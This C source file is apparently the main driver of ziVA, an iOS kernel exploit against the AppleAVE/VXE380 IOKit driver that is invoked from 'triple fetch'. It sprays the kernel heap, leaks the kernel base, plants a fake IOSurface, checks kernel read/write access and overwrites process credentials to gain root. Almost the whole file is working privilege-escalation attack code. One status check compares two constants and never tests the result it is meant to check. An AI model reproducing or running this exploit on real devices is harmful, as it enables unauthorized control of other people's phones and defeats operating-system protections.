#include "kernel_read.h"
#include "apple_ave_pwn.h"
#include "offsets.h"
#include "heap_spray.h"
#include "iosurface_utils.h"
#include "rwx.h"
#include "post_exploit_ziva.h"

#include "unjail.h"
#include "Utilities.h"

#define KERNEL_MAGIC 							(0xfeedfacf)


static
kern_return_t initialize_iokit_connections() {
	
	kern_return_t ret = KERN_SUCCESS;

	ret = apple_ave_pwn_init();
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: initializing AppleAVE/VXE380 pwn\n");
		goto cleanup;
	}

	ret = kernel_read_init();
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: initializing kernel read\n");
		goto cleanup;
	}

cleanup:
	if (KERN_SUCCESS != ret)
	{
		kernel_read_cleanup();
		apple_ave_pwn_cleanup();
	}
	return ret;
}


// Cleans up IOKit resources.
static
kern_return_t cleanup_iokit() {
	
	kern_return_t ret = KERN_SUCCESS;
	kernel_read_cleanup();
	apple_ave_pwn_cleanup();

	return ret;	
}


// Tests our RW capabilities, then overwrites our credentials so we are root.
static
kern_return_t test_rw_and_get_root() {
	
	kern_return_t ret = KERN_SUCCESS;
	uint64_t kernel_magic = 0;

	ret = rwx_read(offsets_get_kernel_base(), &kernel_magic, 4);
	if (KERN_SUCCESS != ret || KERNEL_MAGIC != kernel_magic)
	{
		printf("[ERROR]: reading kernel magic\n");
		if (KERN_SUCCESS == ret)
		{
			ret = KERN_FAILURE;
		}
		goto cleanup;
	} else {
		printf("kernel magic: %x\n", (uint32_t)kernel_magic);
	}

	ret = post_exploit_get_kernel_creds();
	if (KERN_SUCCESS != ret || getuid())
	{
		printf("[ERROR]: getting root\n");
		if (KERN_SUCCESS == ret)
		{
			ret = KERN_NO_ACCESS;
		}
		goto cleanup;
	}

cleanup:
	return ret;
}

// Called by triple fetch
int ziva_go() {
    
	kern_return_t ret = KERN_SUCCESS;
	void * kernel_base = NULL;
	void * kernel_spray_address = NULL;

    printf("[*] starting ziVA..\n");
    
    if(get_privileged_port() == MACH_PORT_NULL) {
        printf("[ERROR]: Got an null privileged port.\n");
        return 0; // Fail
    }
    
	if (initialize_iokit_connections() != KERN_SUCCESS) {
		printf("[ERROR]: initializing IOKit connections!\n");
		return 0; // Fail
	}
    
	if (heap_spray_init() != KERN_SUCCESS) {
		printf("[ERROR]: initializing heap spray\n");
        return 0; // Fail
	}
    
	if (kernel_read_leak_kernel_base(&kernel_base) != KERN_SUCCESS) {
		printf("[ERROR]: leaking kernel base\n");
        return 0; // Fail
	}

    printf("[INFO]: Got kernel base at: %p\n", kernel_base);

	offsets_set_kernel_base(kernel_base);
    
	if (heap_spray_start_spraying(&kernel_spray_address) != KERN_SUCCESS) {
		printf("[ERROR]: spraying heap\n");
        return 0; // Fail
	}

	ret = apple_ave_pwn_use_fake_iosurface(kernel_spray_address);
	if (KERN_SUCCESS != kIOReturnError)
	{
		printf("[ERROR]: using fake IOSurface... we should be dead by here.\n");
	} else {
        printf("[INFO]: We're still alive and the fake surface was used\n");
	}

	ret = test_rw_and_get_root();
	if (KERN_SUCCESS != ret)
	{
		printf("[ERROR]: getting root\n");
        return 0; // Fail
	}

    // We're root now!
    printf("[INFO]: ziVA is now root\n");
    
    
    return 1; // Success!
}
